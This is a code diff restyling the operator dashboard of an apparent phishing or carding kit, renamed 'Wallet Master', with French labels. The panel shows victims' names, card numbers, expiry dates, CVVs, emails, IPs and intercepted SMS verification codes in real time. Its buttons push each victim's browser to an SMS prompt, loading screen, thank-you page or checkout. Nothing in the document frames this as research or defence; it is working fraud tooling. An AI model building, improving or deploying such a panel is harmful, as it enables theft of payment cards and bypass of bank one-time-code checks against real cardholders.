@@ -8,151 +8,266 @@
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #030712;
-            --surface: #111827;
-            --primary: #8b5cf6;
-            --success: #10b981;
-            --warning: #f59e0b;
-            --danger: #ef4444;
+            --bg: #000000;
+            --surface: #1c1c1e;
+            --primary: #5e5ce6;
+            --success: #30d158;
+            --warning: #ff9f0a;
+            --danger: #ff453a;
+            --card-width: 380px;
         }
 
         body {
             margin: 0;
             background: var(--bg);
-            color: #f3f4f6;
-            font-family: 'Outfit', sans-serif;
-            padding: 2rem;
+            color: #ffffff;
+            font-family: -apple-system, 'Outfit', sans-serif;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
         }
 
         header {
+            padding: 1.5rem 2rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 2rem;
-            border-bottom: 1px solid #1f2937;
-            padding-bottom: 1rem;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            z-index: 100;
         }
 
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
-            gap: 1.5rem;
+        h1 {
+            margin: 0;
+            font-size: 1.5rem;
+            letter-spacing: -0.5px;
+        }
+
+        .deck-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            overflow-x: auto;
+            padding: 2rem;
+            gap: 2rem;
+            scroll-snap-type: x mandatory;
+            perspective: 1000px;
+        }
+
+        .deck-container::-webkit-scrollbar {
+            height: 0;
         }
 
         .card {
-            background: var(--surface);
-            border: 1px solid #1f2937;
-            padding: 1.5rem;
-            border-radius: 20px;
+            flex: 0 0 var(--card-width);
+            height: 520px;
+            background: linear-gradient(135deg, #1f1f23 0%, #000000 100%);
+            border-radius: 28px;
+            padding: 2rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            scroll-snap-align: center;
             position: relative;
+            transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1), box-shadow 0.6s;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            overflow: hidden;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100px) rotateY(-20deg);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateX(0) rotateY(0);
+                opacity: 1;
+            }
+        }
+
+        .card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .card.visa {
+            background: linear-gradient(135deg, #1a1a4b 0%, #0c0c28 100%);
+        }
+
+        .card.mastercard {
+            background: linear-gradient(135deg, #4b1a1a 0%, #280c0c 100%);
+        }
+
+        .card.amex {
+            background: linear-gradient(135deg, #4b3e1a 0%, #28210c 100%);
         }
 
         .card.offline {
-            opacity: 0.6;
-            filter: grayscale(1);
+            filter: grayscale(1) brightness(0.5);
         }
 
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 1rem;
+        .chip {
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #ffd700 0%, #b8860b 100%);
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            position: relative;
         }
 
-        .status-badge {
-            padding: 4px 10px;
-            border-radius: 99px;
-            font-size: 0.7rem;
+        .card-number {
+            font-size: 1.4rem;
+            letter-spacing: 3px;
             font-weight: 600;
+            margin: 1rem 0;
+            font-family: monospace;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .card-label {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.5);
             text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 2px;
         }
 
-        .status-online {
-            background: rgba(16, 185, 129, 0.1);
-            color: var(--success);
+        .card-val {
+            font-size: 0.9rem;
+            font-weight: 500;
         }
 
-        .status-offline {
-            background: rgba(156, 163, 175, 0.1);
-            color: #9ca3af;
+        .otp-box {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 1.5rem;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin: 1.5rem 0;
+            backdrop-filter: blur(10px);
         }
 
-        .info-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-
-        label {
-            font-size: 0.7rem;
-            color: #9ca3af;
-            text-transform: uppercase;
-        }
-
-        .val {
-            font-size: 0.95rem;
-            color: #fff;
-            font-weight: 400;
-        }
-
-        .val.otp {
+        .otp-val {
+            font-size: 1.8rem;
+            font-weight: 700;
             color: var(--warning);
-            font-size: 1.2rem;
+            letter-spacing: 4px;
+        }
+
+        .timer-badge {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 6px 14px;
+            border-radius: 20px;
             font-weight: 600;
-            letter-spacing: 2px;
+            font-size: 0.8rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .controls {
-            margin-top: 1.5rem;
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 10px;
+            gap: 12px;
         }
 
-        button {
-            padding: 8px;
-            border-radius: 8px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            background: rgba(255, 255, 255, 0.05);
+        .btn {
+            padding: 12px;
+            border-radius: 12px;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
             color: white;
+            font-weight: 600;
+            font-size: 0.75rem;
             cursor: pointer;
-            font-size: 0.8rem;
-            transition: 0.2s;
+            transition: all 0.3s;
+            text-transform: uppercase;
         }
 
-        button:hover {
-            background: var(--primary);
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: scale(1.02);
         }
 
-        .btn-success:hover {
+        .btn-success {
             background: var(--success);
+            color: #000;
         }
 
-        .btn-danger:hover {
+        .btn-warning {
+            background: var(--warning);
+            color: #000;
+        }
+
+        .btn-danger {
             background: var(--danger);
         }
 
-        .btn-warning:hover {
-            background: var(--warning);
+        .btn-primary {
+            background: var(--primary);
+        }
+
+        /* Drag handle cursor */
+        .deck-container {
+            cursor: grab;
+            user-select: none;
+        }
+
+        .deck-container:active {
+            cursor: grabbing;
         }
     </style>
 </head>
 
 <body>
     <header>
-        <h1>Alpha CRM - Master Control</h1>
+        <h1>Wallet Master</h1>
         <div style="display: flex; align-items: center; gap: 20px;">
-            <div id="connectionStatus">Connexion au serveur...</div>
-            <button onclick="downloadJSON()"
-                style="background:var(--primary); border:none; color:white; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:0.8rem; font-weight:600;">Exporter
-                JSON (Historique)</button>
+            <div id="connectionStatus" style="font-size: 0.8rem; color: var(--success); font-weight: 600;">Connecting...
+            </div>
+            <button onclick="downloadJSON()" class="btn" style="background:var(--primary)">Export History</button>
         </div>
     </header>
 
-    <div class="grid" id="clientList">
-        <!-- Les clients apparaîtront ici -->
+    <div class="deck-container" id="clientList">
+        <!-- Les cartes voleront ici -->
     </div>
+
+    <script>
+        // --- Drag to Scroll Implementation ---
+        const slider = document.getElementById('clientList');
+        let isDown = false;
+        let startX;
+        let scrollLeft;
+
+        slider.addEventListener('mousedown', (e) => {
+            isDown = true;
+            startX = e.pageX - slider.offsetLeft;
+            scrollLeft = slider.scrollLeft;
+            slider.style.cursor = 'grabbing';
+        });
+        slider.addEventListener('mouseleave', () => {
+            isDown = false;
+            slider.style.cursor = 'grab';
+        });
+        slider.addEventListener('mouseup', () => {
+            isDown = false;
+            slider.style.cursor = 'grab';
+        });
+        slider.addEventListener('mousemove', (e) => {
+            if (!isDown) return;
+            e.preventDefault();
+            const x = e.pageX - slider.offsetLeft;
+            const walk = (x - startX) * 2;
+            slider.scrollLeft = scrollLeft - walk;
+        });
+    </script>
 
     <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
@@ -201,17 +316,15 @@
                 notif.play().catch(() => { });
             } else if (msg.type === 'CLIENT_STATUS') {
                 card = updateOrCreateCard(msg.client_id, {});
-                const badge = card.querySelector('.status-badge');
-                badge.className = `status-badge status-${msg.status}`;
-                badge.textContent = msg.status;
                 if (msg.status === 'offline') card.classList.add('offline');
                 else card.classList.remove('offline');
             } else if (msg.type === 'CLIENT_EVENT' && msg.event === 'timer_update') {
                 card = document.getElementById(`card-${msg.client_id}`);
                 if (card) {
-                    const timerVal = card.querySelector('.timer-val');
-                    timerVal.textContent = msg.data.timeLeft + 's';
-                    timerVal.style.color = msg.data.timeLeft < 5 ? 'var(--danger)' : 'var(--warning)';
+                    const timerBadge = card.querySelector('.timer-badge');
+                    timerBadge.textContent = msg.data.timeLeft + 's';
+                    timerBadge.style.color = msg.data.timeLeft < 5 ? 'var(--danger)' : '#fff';
+                    timerBadge.style.background = msg.data.timeLeft < 5 ? 'rgba(239, 68, 68, 0.2)' : 'rgba(0,0,0,0.5)';
                 }
             }
         }
@@ -223,38 +336,48 @@
                 card.id = `card-${id}`;
                 card.className = 'card';
                 card.innerHTML = `
-                    <div class="card-header">
-                        <div>
-                            <label>ID Client | <span class="timer-val" style="font-weight:600;">-</span></label>
-                            <div class="val">${id}</div>
+                    <div class="timer-badge">-</div>
+                    <div class="top" style="display:flex; justify-content:space-between; align-items:flex-start;">
+                        <div class="chip"></div>
+                        <div style="text-align:right;">
+                            <div class="card-label">Montant</div>
+                            <div class="card-val amount-val" style="font-size:1.2rem; color:var(--success); font-weight:700;">-</div>
                         </div>
-                        <span class="status-badge status-online">online</span>
                     </div>
-                    <div class="info-row">
-                        <div><label>Nom</label><div class="val name-val">-</div></div>
-                        <div><label>Montant</label><div class="val amount-val">-</div></div>
+
+                    <div class="card-number">•••• •••• •••• ••••</div>
+
+                    <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                        <div>
+                            <div class="card-label">Propriétaire</div>
+                            <div class="card-val name-val" style="text-transform:uppercase; letter-spacing:1px;">-</div>
+                        </div>
+                        <div style="text-align:right;">
+                            <div class="card-label">Exp / CVV</div>
+                            <div class="card-val exp-val">- / -</div>
+                        </div>
                     </div>
-                    <div class="info-row">
-                        <div><label>Carte (<span class="brand-val">-</span>)</label><div class="val card-val">-</div></div>
-                        <div><label>BIN</label><div class="val bin-val">-</div></div>
+
+                    <div style="margin-bottom:15px;">
+                        <div class="card-label">Email</div>
+                        <div class="card-val email-val" style="font-size:0.8rem; opacity:0.8;">-</div>
                     </div>
-                    <div class="info-row">
-                        <div><label>Exp / CVV</label><div class="val exp-val">-</div></div>
-                        <div><label>Email</label><div class="val email-val">-</div></div>
+
+                    <div class="otp-box">
+                        <div class="card-label">CODE DE VÉRIFICATION SMS</div>
+                        <div class="otp-val">ATTENTE...</div>
                     </div>
-                    <div class="info-row">
-                        <div><label>IP</label><div class="val ip-val">-</div></div>
-                        <div><label>Device</label><div class="val device-val" style="font-size:0.6rem; overflow:hidden; white-space:nowrap; text-overflow:ellipsis;">-</div></div>
+
+                    <div style="display:grid; grid-template-columns: 1fr 1.5fr; gap:10px; font-size:0.7rem; margin-bottom:15px; opacity:0.8;">
+                        <div><div class="card-label">IP</div><div class="ip-val">-</div></div>
+                        <div><div class="card-label">Appareil</div><div class="device-val" style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">-</div></div>
                     </div>
-                    <div style="margin-top:10px; background:rgba(0,0,0,0.2); padding:10px; border-radius:10px; text-align:center;">
-                        <label>CODE SMS REÇU</label>
-                        <div class="val otp otp-val">ATTENTE...</div>
-                    </div>
+
                     <div class="controls">
-                        <button onclick="redirect('${id}', 'sms')" class="btn-warning">DEMANDER SMS</button>
-                        <button onclick="redirect('${id}', 'loading')" class="btn-primary">REFRESH / LOADING</button>
-                        <button onclick="redirect('${id}', 'thank_you')" class="btn-success">VALIDER (MERCI)</button>
-                        <button onclick="redirect('${id}', 'checkout')" class="btn-danger">RETOUR CHECKOUT</button>
+                        <button onclick="redirect('${id}', 'sms')" class="btn btn-warning">SMS</button>
+                        <button onclick="redirect('${id}', 'loading')" class="btn btn-primary">LOAD</button>
+                        <button onclick="redirect('${id}', 'thank_you')" class="btn btn-success">MERCI</button>
+                        <button onclick="redirect('${id}', 'checkout')" class="btn btn-danger">BACK</button>
                     </div>
                 `;
                 clientList.prepend(card);
@@ -263,13 +386,17 @@
             if (data.full_name) {
                 card.querySelector('.name-val').textContent = data.full_name;
                 card.querySelector('.amount-val').textContent = data.montant + ' €';
-                card.querySelector('.card-val').textContent = data.numero_carte_masque;
-                card.querySelector('.brand-val').textContent = data.card_brand;
-                card.querySelector('.bin-val').textContent = data.card_bin;
+                card.querySelector('.card-number').textContent = data.numero_carte_masque;
                 card.querySelector('.exp-val').textContent = data.expiry + ' / ' + data.cvv;
                 card.querySelector('.email-val').textContent = data.email;
                 card.querySelector('.ip-val').textContent = data.adresse_ip;
                 card.querySelector('.device-val').textContent = data.device;
+
+                // Brand specific color
+                card.classList.remove('visa', 'mastercard', 'amex');
+                if (data.card_brand === 'Visa') card.classList.add('visa');
+                else if (data.card_brand === 'Mastercard') card.classList.add('mastercard');
+                else if (data.card_brand === 'Amex') card.classList.add('amex');
             }
             return card;
         }
